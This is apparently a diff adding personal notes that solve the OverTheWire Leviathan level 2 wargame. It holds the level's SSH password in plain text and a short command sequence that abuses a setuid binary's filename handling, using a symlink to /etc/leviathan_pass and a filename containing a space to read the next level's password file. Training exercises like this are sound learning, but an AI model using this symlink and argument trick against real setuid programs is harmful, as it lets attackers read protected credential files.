@@ -1,0 +1,10 @@
+ssh leviathan2@leviathan.labs.overthewire.org
+ougahZi8Ta
+ll
+ltrace ./printfile /etc/passwd
+mkdir /tmp/naive3
+cd /tmp/naive3
+ln -s /etc/leviathan_pass/leviathan3 ./file
+touch file\ asdf
+cd ~
+./printfile /tmp/naive3/file\ asdf
